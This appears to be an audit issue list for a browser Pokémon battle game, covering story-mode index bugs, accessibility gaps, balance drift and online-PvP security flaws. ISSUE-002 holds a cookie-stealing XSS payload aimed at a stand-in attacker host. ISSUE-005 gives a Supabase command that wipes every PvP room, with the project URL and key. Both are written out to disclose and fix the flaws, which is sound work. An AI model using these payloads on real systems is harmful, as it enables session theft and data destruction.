- [ISSUE-390] [P3] Player gimmick-unlock order shifts when a mechanic is disabled in settings — DMax unlocks at Gym 5 instead of Gym 6 if Mega is off — `settings.megaOn` (dx)
- [ISSUE-391] [P3] `shouldForceCityProfessor` uses dead `sm.team.length < 6` floor that's shadowed by outer `hasTeamRoom` gate — `shouldForceCityProfessor` (refactor)
- [ISSUE-392] [P3] `shouldForceCityProfessor`'s `sm.team.length < 6` floor is dead-coded once the outer `hasTeamRoom` gate clamps to `_storyMaxPartySize()` — `shouldForceCityProfessor` (dx)
- [ISSUE-393] [P3] Stale comment claims rival secondary intro "Uses Math.random" — it now uses seeded _storySideRng — `showBattleIntro` (inconsistency)
- [ISSUE-394] [P3] Mobile move-details "i" is a span[role=button] with no tabindex/keydown — keyboard cannot reach it — `showMoves` (a11y)
- [ISSUE-395] [P3] Victory overlay auto-dismisses after 6s regardless of how much narrative it stacks — the biggest story beats can vanish before they're read — `showVictoryOverlay` (dx)
- [ISSUE-396] [P3] Subject Zero stored to PC (party-full at cage) shows "Subject Zero" nickname but is never auto-fielded — easy to miss the capstone mon — `showVictoryOverlay` (inconsistency)
- [ISSUE-397] [P3] Inconsistent auto-dismiss across scene types — victory 6s timeout vs beat scenes never auto-dismiss — `showVictoryOverlay` (inconsistency)
- [ISSUE-398] [P3] Doc battle.html:LINE anchors are stale (23/43 drifted across the spec docs) — `spec-drift-doc-anchors` (dx)
- [ISSUE-399] [P3] Mystery Figure identity is rolled at run start before sm.active/runSeed are live — not reproducible under fixed debug seeds — `startNewRun` (bug)
- [ISSUE-400] [P3] Row-67 `STORY_BEATS` still tags `'cagedGod'` + coldOpen `mystery67` — stale cut-arc residue in the live beat map — `STORY_BEATS` (dx)
- [ISSUE-401] [P3] Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon` — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-402] [P3] Doc line anchors stale — 18/50 `battle.html:LINE` refs in design docs no longer resolve (clustered) — `STORY_EVENTS_RAW` (dx)
- [ISSUE-403] [P3] Doc `battle.html:LINE` anchors stale — 18/50 references drifted (cluster) — `STORY_EVENTS_RAW` (dx)
- [ISSUE-404] [P3] Doc `battle.html:LINE` anchors stale in surviving specs — 24/44 drifted (post-cleanup cluster; updates ISSUE-330) — `STORY_EVENTS_RAW` (dx)
- [ISSUE-405] [P3] Service-timeline pacing — City1 post-gym hub is a dead zone (no new "thing to do") — `STORY_EVENTS_RAW` (balance)
- [ISSUE-406] [P3] STORY_EVENTS_RAW has 67 array rows (incl. 2 'Hall of Fame' string matches) — mandate/spec cite "68 rows" — `STORY_EVENTS_RAW` (data)
- [ISSUE-407] [P3] STORY_EVENTS_RAW resolves to 67 rows in harness vs 68 stated in spec/mandate — `STORY_EVENTS_RAW` (data)
- [ISSUE-408] [P3] Timeline is 67 rows; STORY_MODE_FLOW.md (and this update's brief) still say "68 rows" — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-409] [P3] STORY_MODE_FLOW §4 still specs the flat Safari weights g1:3/g2:22/g3:50/g4:25; live code is a badge curve (_SAFARI_GRADE_CURVE_BY_BADGES) — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-410] [P3] `STORY_IV_TIER_RANGES` is dead — superseded by `STORY_IV_TIER_CENTER`, zero consumers — `STORY_IV_TIER_RANGES` (refactor)
- [ISSUE-411] [P3] THREE story IV tables coexist — `STORY_IV_TIER_RANGES` is fully dead; `STORY_IV_TIER_CENTER` is Frontier-only; only `STORY_IV_CITY_*` is the live story curve — `STORY_IV_TIER_RANGES` (inconsistency)
- [ISSUE-412] [P3] docs/STORY_MODE_AUDIT.md is stale — most of its flagged issues are now fixed (SAVE_VER 14→22) — `STORY_MODE_AUDIT` (dx)
- [ISSUE-413] [P3] 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines) — `STORY_MODE_CATCH_INTEGRATION_RISK.md` (dx)
- [ISSUE-414] [P3] Doc `battle.html:LINE` anchors still stale (50 refs, 18 drifted) despite PR #140 "fix" — `STORY_MODE_CATCH_INTEGRATION_RISK.md` (dx)
- [ISSUE-415] [P3] 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines) — `STORY_MODE_FLOW.md` (dx)
- [ISSUE-416] [P3] STORY_MODE_FLOW.md PC cap of 10 contradicts shipped PC_BOX_CAP=30 — `STORY_MODE_FLOW.md` (data)
- [ISSUE-417] [P3] Doc line anchors stale across 4 specs (still drifting post-v24; cluster) — `STORY_NARRATIVE_VARIANTS` (dx)
- [ISSUE-418] [P3] 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines) — `STORY_NARRATIVE_VARIANTS.md` (dx)
- [ISSUE-419] [P3] Spec/mandate says timeline is "68 rows"; STORY_EVENTS_RAW has 67 (array idx 0–66), and rowId 68 is the intro Rival at array idx 1 — `STORY_RIVAL_ROW_INTRO` (inconsistency)
- [ISSUE-420] [P3] Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance — `STORY_TUTORIAL_SCENES` (dx)
- [ISSUE-421] [P3] Catch ball buttons lack accessible name reading the success %; bare-icon img alt empty — `story-catch-ball` (a11y)
- [ISSUE-422] [P3] Crucible & Catch headers use empty spacer spans instead of a back control; no escape from Crucible header — `story-crucible-header` (a11y)
- [ISSUE-423] [P3] Pokédex counts strip updates live (seen/caught) but is not an aria-live region — `story-pc-pokedex-strip` (a11y)
- [ISSUE-424] [P3] Dead CSS selector for a #story-pc-tab-journal-btn that has no markup or handler — `story-pc-tab-journal-btn` (refactor)
- [ISSUE-425] [P3] Pokémon Center tab buttons not exposed as a tablist (no role=tab/tabpanel) — `story-pc-tab-storage-btn` (a11y)
- [ISSUE-426] [P3] Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline — `story-shop-buy-btn` (a11y)
- [ISSUE-427] [P3] Tutorial overlay's four-stage entrance animation has no reduced-motion fallback — `story-tutorial-overlay` (a11y)
- [ISSUE-428] [P3] Scope-leak audit (same class as fixed `sm` bug) — NEGATIVE: no other IIFE-internal symbol referenced bare from turn-loop scope — `storyAwareRng` (inconsistency)
- [ISSUE-429] [P3] `storyAwareRng()` helper exists but the combat engine still calls bare `Math.random()` at ~250 sites — `storyAwareRng` (dx)
- [ISSUE-430] [P3] Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile — `storyCatchMasterPulse` (a11y)
- [ISSUE-431] [P3] CONFIRMED FIXED — Hard coin mult floored to 1.00 (prior audit 2.1); Challenge 1.10 — `storyDifficultyCoinMult` (balance)
- [ISSUE-432] [P3] Hard mode still earns less gold per fight than Normal (1.00 vs 1.30) despite facing 1.15x-stronger foes — residual difficulty/economy asymmetry — `storyDifficultyCoinMult` (balance)
- [ISSUE-433] [P3] `storyRngNext` / per-engine-entry `rng` ternary accessor is **0.0003 ms (300 ns) per call** — no closure allocation penalty, accessor pattern is clean — `storyRngNext` (perf)
- [ISSUE-434] [P3] Status indicator toggles role="status" + aria-label onto a <div> at content-mutation time — `updateUI` (a11y)
- [ISSUE-435] [P3] Upper Hand / Shell Trap don't enforce their precondition gate — `Upper Hand` (bug)
- [ISSUE-436] [P3] `sm.wildSeenByEventIdx` and `sm.staticDrops` are lazily initialized instead of declared in the `sm` defaults block — `wildSeenByEventIdx` (dx)
- [ISSUE-437] [P4] VERIFIED OK — boss/raid reward double-grant across the two call sites is structurally prevented — `_activeBattleBeatForCurrentRow` (bug)
- [ISSUE-438] [P4] `_bossWeatherLocked` / `_bossTerrainLocked` flags are set but never read — field "lock" is opening-state only — `_storyBossMechanicsBattleInit` (refactor)
- [ISSUE-439] [P4] VERIFIED OK — extra-arc raid "laid to rest, no catch" lock is enforced structurally — `enterCatchEncounter` (bug)
- [ISSUE-440] [P4] `SAVE_VER = 23` but migration dispatch stops at `_loadedVer < 22` — no numbered v23 step — `SAVE_VER` (dx)
- [ISSUE-441] [P4] Three redundant RNG-routing mechanisms; confusion self-hit relies solely on the global Math.random patch while siblings use storyAwareRng() — `storyAwareRng` (inconsistency)

---

## <a id="ISSUE-001"></a> ISSUE-001: Crucible League Run + Random Gym Rematch use row ids as array indices — wrong opponents (skips E1, runs into Rival; can launch City3)

---
id: ISSUE-001
severity: P0
category: bug
anchor_symbol: _CRUCIBLE_LEAGUE_ROWS
current_line_hint: ~48057
file: battle.html
agents: [story-mode-investigator]
fingerprint: 307c0fad776a
confidence: high
status: open
---

**Title**: Crucible League Run + Random Gym Rematch use row ids as array indices — wrong opponents (skips E1, runs into Rival; can launch City3)

**Evidence**:
```js
const _CRUCIBLE_GYM_ROWS   = [5, 11, 18, 24, 31, 38, 46, 53]; // labelled "GL1..GL8" — these are ROW IDS
const _CRUCIBLE_LEAGUE_ROWS = [60, 61, 62, 63, 64];          // labelled "E1..E4 + Champion" — ROW IDS
// consumed as array indices:  _crucibleBattleSetup(_CRUCIBLE_LEAGUE_ROWS[0]) -> sm.eventIndex = 60 -> STORY_EVENTS_RAW[60]
```
Resolved against the array (length 67):
- `_CRUCIBLE_LEAGUE_ROWS` as array indices = **E2, E3, E4, Champion, Rival** — the League Run starts at E2 (skips E1) and ends on the post-Champion *Rival* as a bogus 5th "league" stage. (E1 is at array index 59, Champion at 63.)
- `_CRUCIBLE_GYM_ROWS[2] = 18` → array index 18 = **City3** (a City row). A Random Gym Rematch that rolls Gym 3 (1/8 chance) hands a City row to `enterBattleEvent`, which calls `enterCity()` — dumping the player into City3's hub instead of a gym fight. (Gym Leader 3 is at array index 17.) Indices 5/11/24/31/38/46/53 happen to coincide with their rows, so 7 of 8 gyms work by luck; only GL3 is misrouted.

**Repro** (jsdom): `StoryMode.crucibleLeagueRun()` → `sm.eventIndex = 60` → `STORY_EVENTS_RAW[60][2] === 'E2'`. `_CRUCIBLE_GYM_ROWS[2] = 18` → `STORY_EVENTS_RAW[18][1] === 'City'`.

**Blast radius**: Crucible League Run and Random Gym Rematch (post-game hub the maintainer just sub-sectioned). The league-chain bug compounds via `_handleCrucibleBattleEnd` which advances `_CRUCIBLE_LEAGUE_ROWS[stage+1]` (also indices). Root cause is shared with the Mystery/Rival findings: row id ≠ array index after the Rival rows (ids 12/39/65) and City3 were spliced out of id-order in the literal.

**Fix sketch**: Derive all four constants from `STORY_EVENTS_RAW` by event name at boot, mirroring `GYM_CITY_LEADER_EVENT`'s `buildGymCityLeaderMap` pattern — e.g. build `{1: arrIdx, ...}` for `Gym Leader N`, and `[E1idx,E2idx,E3idx,E4idx,Champion idx]` for the league. This makes them shift-proof. Add a boot-time assertion that each resolved index's `row[2]` matches the expected event name.

**Verification**: League Run = E1→E2→E3→E4→Champion (5 stages, no Rival); every Random Gym Rematch launches a Gym Leader battle (never a City/HoF screen).

---

## <a id="ISSUE-002"></a> ISSUE-002: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

---
id: ISSUE-002
severity: P0
category: security
anchor_symbol: applyBattleLogHtml
current_line_hint: ~223
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 965f251a0c94
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

**Evidence**:
```js
// online-pvp.js L214-231  — capture host's #battle-log innerHTML, push as raw string,
// guest re-injects with .innerHTML (no sanitization, no DOMPurify, nothing).
function captureBattleLogHtml() {
    const el = global.document && global.document.getElementById('battle-log');
    return el ? el.innerHTML : '';
}
function applyBattleLogHtml(html) {
    const el = global.document.getElementById('battle-log');
    if (!el) return;
    el.innerHTML = typeof html === 'string' ? html : '';  // <-- SINK
}
// L629, L657, L708, L722 push battle_log_html; L757, L782 apply it on the guest.
```

**Repro**: Combined with the open RLS finding above: attacker calls `client.from('pvp_rooms').update({ data: { ...prev, battle_log_html: '<img src=x onerror="fetch(`https://attacker/?c=`+document.cookie)">', seq: prev.seq+1 } }).eq('id', live_room_id)`. The realtime UPDATE arrives at every subscribed peer (host + guest), passes the `seq > lastRemoteSeq` gate, reaches `onOnlineRoomData` → `guestApplyBattleBlob` (L782) or `guestApplyBattleStart` (L757), which calls `applyBattleLogHtml(d.battle_log_html)` → arbitrary script executes in the victim's origin. Steals localStorage (including the Supabase session if ever upgraded to auth) and the player's display name; can render fake "you lost" screens; can pivot to the rest of `battle.html` globals.

**Blast radius**: Every live PvP match. Even without the open-RLS angle, any peer is implicitly trusted: a malicious *host* can already feed the guest arbitrary HTML on every turn. `logMsg` at battle.html:12972 does `div.innerHTML = processedMsg` where `processedMsg` interpolates `mon.name` into both attribute and text contexts (`data-mn="${enc}"` is escaped, but the textContent slot `>${moveName}</span>` is not — and `mon.name` for a Pokemon comes from team builds that flow through the draft pool, so any custom team upload with a crafted `name` field plants a payload in the host's log, which then ships to the guest verbatim).

**Fix sketch**: Either (a) don't transmit HTML — send the structured log entries (array of `{ msg, type, mon, move }`) and let each client format with the same `logMsg` template-safe path; or (b) hard-sanitize through DOMPurify before `innerHTML=` (allow only `<div class="log-…"><span class="…" data-mn="…">…</span></div>` — no scripts, no `on*` attributes, no `javascript:`). (a) is the architecturally right answer because it also eliminates the size-of-HTML bloat in `data.battle_log_html`.

**Verification**: New integration test: simulate a remote row with `battle_log_html: '<img src=x onerror="window.__xssFired=true">'`, run through `guestApplyBattleBlob`, assert `window.__xssFired === undefined`. Plus a unit test asserting `applyBattleLogHtml` strips `<script>`, `on*` attributes, and `javascript:` URLs.

---

## <a id="ISSUE-003"></a> ISSUE-003: Crucible "Mystery Figure" button is dead — STORY_POST_HOF_MYSTERY_ROW (67) is out of bounds as an array index

---
id: ISSUE-003
severity: P0
category: bug
anchor_symbol: crucibleMysteryFight
current_line_hint: ~48159
file: battle.html
agents: [story-mode-investigator]
fingerprint: 691dcd5cb693
confidence: high
status: open
---

**Title**: Crucible "Mystery Figure" button is dead — STORY_POST_HOF_MYSTERY_ROW (67) is out of bounds as an array index

**Evidence**:
```js
const STORY_POST_HOF_MYSTERY_ROW = 67;           // this is a ROW ID
function crucibleMysteryFight() { _crucibleBattleSetup(STORY_POST_HOF_MYSTERY_ROW, 'mystery'); }
// _crucibleBattleSetup:  sm.eventIndex = targetEventIdx|0;  const ev = STORY_EVENTS_RAW[sm.eventIndex];
//                        if (!ev) { sm.crucibleBattleSource = null; enterCrucible(); return; }
```
`STORY_EVENTS_RAW` has 67 entries (array indices 0–66). The Mystery Figure row has **row id 67** but sits at **array index 66**. `_crucibleBattleSetup` assigns `sm.eventIndex = 67` then reads `STORY_EVENTS_RAW[67]` → `undefined` → bails straight back to `enterCrucible()`. The button does nothing.

**Repro** (jsdom): `StoryMode.crucibleMysteryFight()` with a post-HoF sm → `sm.eventIndex` becomes 67, `crucibleBattleSource` reset to null, screen returns to Crucible. Confirmed: `STORY_EVENTS_RAW[67] === undefined`; Mystery Figure is at index 66.

**Blast radius**: The Crucible Mystery Figure encore (the maintainer's named priority: "Mystery Figure post-HoF climax + rematch"). The *first* climax via `continuePostGame` works because it uses `findIndex` (resolves to 66); only the Crucible replay button is broken. `continuePostGame` and `_storyMilestoneKeyForEvent` compare `rowIdx === STORY_POST_HOF_MYSTERY_ROW` against `ev[0]` (the row id), so the constant value 67 is correct *there* — the bug is feeding a row-id into the array-index-expecting `_crucibleBattleSetup`.

**Fix sketch**: Resolve the array index by name/row-id inside the Crucible setup, e.g. `const idx = STORY_EVENTS_RAW.findIndex(r => r && (r[0]|0) === STORY_POST_HOF_MYSTERY_ROW);` and pass `idx`. Best: make `_crucibleBattleSetup` accept a row id and resolve internally, so all four callers are fixed at once (see sibling findings).

**Verification**: Crucible → Mystery Figure launches the masked-trainer fight; `crucibleBattleSource === 'mystery'` after entry.

---

## <a id="ISSUE-004"></a> ISSUE-004: Crucible "Rival Rematch" targets the Hall of Fame row — STORY_LEAGUE_RIVAL_ROW (65) is a row id, not the array index (64)

---
id: ISSUE-004
severity: P0
category: bug
anchor_symbol: crucibleRivalFight
current_line_hint: ~48160
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9e4b435d44de
confidence: high
status: open
---

**Title**: Crucible "Rival Rematch" targets the Hall of Fame row — STORY_LEAGUE_RIVAL_ROW (65) is a row id, not the array index (64)

**Evidence**:
```js
const STORY_LEAGUE_RIVAL_ROW = 65;               // ROW ID
function crucibleRivalFight() { _crucibleBattleSetup(STORY_LEAGUE_RIVAL_ROW, 'rival'); }
// enterBattleEvent(ev,...):  if (ev[1] !== 'Battle') { ... if (ev[1]==='Hall of Fame'){ showHallOfFame(); return; } }
```
The league Rival has row id 65 but sits at **array index 64**. Array index 65 is the **Hall of Fame** row. `_crucibleBattleSetup(65)` sets `sm.eventIndex = 65`, reads the HoF row (which is truthy, so the `!ev` guard passes), and hands it to `enterBattleEvent`, whose non-Battle branch calls `showHallOfFame()`. The Rival Rematch button shows the Hall of Fame screen instead of a rival fight.

**Repro** (jsdom): `StoryMode.crucibleRivalFight()` → `sm.eventIndex = 65` → `STORY_EVENTS_RAW[65]` = `["Hall of Fame", ...]`. Confirmed the actual league Rival is at array index 64.

**Blast radius**: Crucible Rival Rematch (maintainer-named post-game feature). Same root cause as the Mystery and League findings.

**Fix sketch**: Resolve via row id: `STORY_EVENTS_RAW.findIndex(r => r && (r[0]|0) === STORY_LEAGUE_RIVAL_ROW)` (= 64) before passing to setup; or make `_crucibleBattleSetup` row-id-based.

**Verification**: Crucible → Rival Rematch launches the league rival 6v6, not the HoF screen.

---

## <a id="ISSUE-005"></a> ISSUE-005: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

---
id: ISSUE-005
severity: P0
category: security
anchor_symbol: pvp_rooms_update
current_line_hint: ~43
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: a1f5cf704e77
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L29-54  — ALL operations open to anon
-- "MVP: permissive policies for anon + authenticated clients using the anon key.
--  Tighten later (e.g. restrict updates to room owner, RPC join-by-code only)."
create policy "pvp_rooms_update" on public.pvp_rooms for update
  to anon, authenticated using (true) with check (true);
create policy "pvp_rooms_delete" on public.pvp_rooms for delete
  to anon, authenticated using (true);
create policy "pvp_rooms_insert" on public.pvp_rooms for insert
  to anon, authenticated with check (true);
```

**Repro**: With the publishable key from `online-config.js` (`sb_publishable_vLGEm7Ha50A9IhdnKdCoFA_znkPGI6i`) and `https://ynblrcxpubfevqgieuuo.supabase.co`, any third party can: `await client.from('pvp_rooms').delete().neq('id', '00000000-0000-0000-0000-000000000000')` — wipes every active match. Or `update().eq('id', target_room_id).set({data: { ...attacker_blob }})` — hijacks a match mid-draft to inject a chosen team for the opponent. Or `select('code, data')` — scrape every live game's draft picks.

**Blast radius**: Catastrophic for the online-PvP feature. The 002 migration added an atomic `try_join_pvp_room` RPC to fix one TOCTOU, but the underlying UPDATE policy remained wide open — every other write path (`pushData`'s `update().eq('id', roomId)` at L492) trusts the client and there is zero server-side guarantee that the writing client owns the room. This is exactly the "fix later" note that never got applied. All concurrency analysis below assumes a well-behaved peer; under the current RLS, a hostile peer with the anon key can override any of those guarantees by writing directly to the row.

**Fix sketch**: At minimum, route every write through SECURITY DEFINER RPCs that check a per-room caller token (host generates a UUID on createRoom, embedded in `data.host_token` & returned only to host; guest receives a different token via `try_join_pvp_room`). UPDATE policy then becomes `using ((data->>'host_token' = current_setting('request.header.x-pbs-token', true)) OR (data->>'guest_token' = current_setting('request.header.x-pbs-token', true)))`. DELETE policy should be host-only or RPC-only. SELECT can stay permissive (so spectators / rejoins work) but redact draft picks until phase='battle' if competitive integrity matters.

**Verification**: From a fresh browser, with no room joined, attempt `client.from('pvp_rooms').update({ data: { hostile: true } }).eq('id', '<live-room-id>')` — must return `error: row-level security policy violated` instead of silently succeeding.

---

## <a id="ISSUE-006"></a> ISSUE-006: Post-HoF Crucible super-hub is unreachable — city button gated on dead bossArc state

---
id: ISSUE-006
severity: P0
category: bug
anchor_symbol: renderCityActions
current_line_hint: ~43895
file: battle.html
agents: [story-mode-investigator]
fingerprint: f9a5c88627c5
confidence: high
status: wontfix-out-of-scope-crucible
---

**Title**: Post-HoF Crucible super-hub is unreachable — city button gated on dead bossArc state

**Evidence**:
```js
// renderCityActions, ~43895
if (sm.bossArc && sm.bossArc.available) {
    _push('recover', makeActionBtn('🧨 The Crucible','crucible','window.StoryMode.enterCrucible()','center', _facOpts('crucible', [{label:'Post-game',tone:'info'}])));
}
```

The Crucible city-hub button is the ONLY in-city entry point to the post-game super-hub (Crucible / Battle Frontier / Rival Rematch / League Run / Gym Rematch). Its visibility is gated on `sm.bossArc.available`. After the v24 boss-arc removal:
- `migrateStoryPreV24()` (~35118) `delete sm.bossArc` on load.
- `sm.bossArc.available` is initialized to `false` only inside `_bossArcEnsureState` (~49428) and is set to `false` again at ~43157 — it is **never** set to `true` anywhere in the file (`grep -n "bossArc.available\s*=" battle.html` → only `= false`).

So `sm.bossArc && sm.bossArc.available` is permanently falsy and the button never renders. `continuePostGame()` (~54729) drops the player back at `enterCity()` and shows an orientation tip explicitly promising "🧨 The Crucible — every facility you used on the road … with the endless Battle Frontier ladder waiting in the back" — but the button it promises is absent.

**Repro**: Finish a run → Hall of Fame → Continue (Post-Game) → win/lose the Mystery Figure climax → land in a city. No Crucible button appears in the recover section; the promised post-game is inaccessible. (Static proof: `grep -n "bossArc.available =" battle.html` shows only false assignments.)

**Blast radius**: Entire post-game (Crucible facilities, Battle Frontier ladder, Rival Rematch, League Run, Gym Rematch, Mystery Figure encore) becomes dead content. The orientation tip and the v24 spec (§9, §14b) both assume the Crucible is reachable from every visited city.

**Fix sketch**: Replace the `sm.bossArc && sm.bossArc.available` gate with a post-HoF predicate that survives v24 — e.g. `sm.postHofMysteryClimaxDone` (set true after the row-67 climax) or an all-gyms-cleared check. Boss-arc state should no longer gate any live feature.

**Verification**: After the climax, render a city and confirm the Crucible button exists with `onclick=enterCrucible()`; confirm `enterCrucible()` opens the hub.

---

## <a id="ISSUE-007"></a> ISSUE-007: Boss arc soft-locks if enabled gens contain no legendary — cage unlocks but can never be entered

---
id: ISSUE-007
severity: P1
category: bug
anchor_symbol: _bossArcCheckCageUnlock
current_line_hint: ~48494
file: battle.html
agents: [story-mode-investigator]
fingerprint: a319172728a4
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Boss arc soft-locks if enabled gens contain no legendary — cage unlocks but can never be entered

**Evidence**:
```js
function _bossArcCheckCageUnlock() {
    const all = !!(L.ledger && L.recording && L.key);
    if (all && !sm.bossArc.cageUnlocked) {
        sm.bossArc.cageUnlocked = true;          // set unconditionally
        if (!sm.bossArc.boss) sm.bossArc.boss = _bossArcRollLegendary();  // may return null
        ...
// bossEnterCage:
if (!sm.bossArc.boss) {
    sm.bossArc.boss = _bossArcRollLegendary();
    if (!sm.bossArc.boss) { showGameAlert('No legendary Pokémon available...'); return; }
}
```
`_bossArcRollLegendary()` returns null when no `speciesDexIsLegendaryTier` species exist in the enabled gens. `cageUnlocked` is still flipped true and `bossArc.cleared` never flips, so the post-game quest section stays rendered forever with an "Enter the Cage — ???" button that always bounces with an alert.

**Repro**: Start a run with an enabled-gen set that has no sub-legendary/restricted legendary (hard to hit with default gens 1-9, but reachable via a narrow custom gen selection), reach post-HoF, collect 3 leads. Cage unlocks; "Enter the Cage" alerts and refuses; the quest cannot be completed.

**Blast radius**: The boss-arc completion + the `caged_god`/`r_caged_god` achievements + the post-game "over" declaration. Narrow trigger, but a permanent dead quest with no recovery path.

**Fix sketch**: Guard the *post-HoF Master Ball grant* (continuePostGame) and/or `_bossArcCheckCageUnlock` so that if `_bossArcRollLegendary()` yields nothing, the arc is marked unavailable (or the leads are not offered) with an explanatory message ("The Caged God arc needs at least one Legendary in your enabled generations"). Do not flip `cageUnlocked` when no boss can be rolled.

**Verification**: With a legendary-free gen set, the Caged God section is suppressed or shows a clear "unavailable" note; with at least one legendary, the cage opens normally.

---

## <a id="ISSUE-008"></a> ISSUE-008: Casino prize roller (_casinoRollPrize / _randPick) uses Math.random for vitamin/voucher drops

---
id: ISSUE-008
severity: P1
category: bug
anchor_symbol: _casinoRollPrize
current_line_hint: ~50617
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8e80374d06cc
confidence: high
status: open
---

**Title**: Casino prize roller (_casinoRollPrize / _randPick) uses Math.random for vitamin/voucher drops

**Evidence**:
```js
function _randPick(arr) { return arr[(Math.random() * arr.length) | 0]; }   // ~50613
// _casinoRollPrize: if (Math.random() > 0.20) return null; (small tier) etc.
```

**Repro**: Win any casino game; SMALL/BIG/JACKPOT gate + vitamin/voucher selection are Math.random.

**Blast radius**: Prizes grant IVs (vitamins) + tutor/dojo vouchers — PERMANENT progression in save state. Higher impact than spin RNG: same-seed replay yields different durable rewards.

**Fix sketch**: Convert all Math.random() in _casinoRollPrize + _randPick (casino use) to storyRngNext().

**Verification**: Same-seed replay grants identical bundles.

---

## <a id="ISSUE-009"></a> ISSUE-009: Crucible row constants are STORY_EVENTS_RAW *row-ids*, not array indices — `_crucibleBattleSetup` assigns them straight to `sm.eventIndex`

---
id: ISSUE-009
severity: P1
category: bug
anchor_symbol: _crucibleBattleSetup
current_line_hint: ~47905
file: battle.html
agents: [story-mode-investigator]
fingerprint: 39dff38f7dce
confidence: high
status: open
---

**Title**: Crucible row constants are STORY_EVENTS_RAW *row-ids*, not array indices — `_crucibleBattleSetup` assigns them straight to `sm.eventIndex`

**Evidence**:
```js
const _CRUCIBLE_GYM_ROWS = [5, 11, 18, 24, 31, 38, 46, 53]; // "GL1..GL8 in STORY_EVENTS_RAW"
function _crucibleBattleSetup(targetEventIdx, source) {
    sm.crucibleBattleSource = source || 'rematch';
    sm.currentEnemyLock = null;
    sm.eventIndex = targetEventIdx | 0;   // <-- treated as ARRAY INDEX downstream
```
`sm.eventIndex` is an array index everywhere else (load clamps to `STORY_EVENTS_RAW.length-1`; `proceedToNextBattle` iterates `for(i=sm.eventIndex; i<length; i++)`). But the timeline row-ids diverge from positions after row 18: GL3 has `row[0]===18` at array index **17**; E1 has `row[0]===60` at index **59**. Other jump sites correctly convert (`STORY_EVENTS_RAW.findIndex(r => r[0] === 55)` at ~42140). `_crucibleBattleSetup` does not.

**Repro**: Post-HoF → enter Crucible → "Random Gym Rematch". When the random pick is `18` (intended Gym Leader 3), index 18 = the **City3 row** (not a Battle). `enterBattleEvent` warns "expected Battle row" and bounces to `enterCity()`. 1-in-8 of gym rematches silently fails.

**Blast radius**: All Crucible "Battles" buttons (Gym Rematch, League Run, Rival Rematch, Mystery Figure). Post-game only, but the entire Crucible battle column is affected.

**Fix sketch**: Either store array indices in the constants (`[5,11,17,24,31,38,46,53]`, league `[59,60,61,62,63]`, rival 64, mystery 66), or resolve at use time via `STORY_EVENTS_RAW.findIndex(r => r[0]===ROWID)`. The latter is drift-proof and matches the existing pattern.

**Verification**: From the Crucible, launch each of the 8 gym rematches + League Run + Rival + Mystery; confirm the foe role matches the button label and no fight bounces to the city.

---

## <a id="ISSUE-010"></a> ISSUE-010: Two early-game foe-softening systems STACK multiplicatively — C0 foe is 64% of base, not the documented ~80%

---
id: ISSUE-010
severity: P1
category: inconsistency
anchor_symbol: _earlyGameFoeStatMult
current_line_hint: ~14953
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 75cdcf609fdb
confidence: high
status: open
---

**Title**: Two early-game foe-softening systems STACK multiplicatively — C0 foe is 64% of base, not the documented ~80%

**Evidence**:
```js
// applyFoeDifficultyScaling (battle.html:15032): layer A
mult *= _earlyGameFoeStatMult();          // FOE_STAT_NERF_BY_CITY = [0.80,0.85,0.90]
// buildPokemon (battle.html:15163): layer B, applied independently to the SAME mon
if (build._storyStatMult ...) mon.stats[k] *= m;  // _STORY_FOE_STAT_BAND C0:-20% → ×0.80
// _STORY_FOE_STAT_BAND = [-20,-17,-13,-10,-7,-3,0,7,13,20]  (battle.html:33621)
```

**Repro**: `node -e` replicating both functions: at C0 a regular trainer = `0.80 (band) × 0.80 (nerf) = 0.64`; C1 = `0.83×0.85=0.705`; C2 = `0.87×0.90=0.783`. The intro rival (row 68) compounds its -25% narrative band with the C0 nerf: `0.75 × 0.80 = 0.60`. Both call sites fire unconditionally for every story battle (`applyFoeDifficultyScaling` via `state.foeParty.forEach` at startBattle:17217; `_storyStatMult` stamped at enterBattleEvent:47595 and consumed in buildPokemon). They are NOT mutually exclusive.

**Blast radius**: Cities 0-2 only (C3+ the legacy nerf is 1.0, so only the band applies). But that is the entire onboarding window — the foes the maintainer's "regular trainers slightly below the player" target is most sensitive to. Both the in-code comment (14931: "~20% at the start, 15% at City 1, 10% at City 2") and the `_STORY_FOE_STAT_BAND` comment (33618: "C0 the band is -20%") describe a SINGLE -20% layer; neither anticipates the other. Extends spec-drift's `FOE_STAT_NERF_BY_CITY` finding (fp 02e46f6ff336), which flagged only the docs-vs-code naming mismatch — not that the table double-applies on top of the per-event stat band.

**Fix sketch**: Decide the intended C0-C2 softening (balance number — user-owned), then collapse to ONE source: either fold `FOE_STAT_NERF_BY_CITY` into `_STORY_FOE_STAT_BAND`'s early entries (make the band itself -36%/-29%/-22% if that is intended) or gate `_earlyGameFoeStatMult` to return 1.0 once `_storyStatMult` is active. Aligns with STORY_OVERHAUL_PLAN §4 "delete the duplicate/conflicting tables".

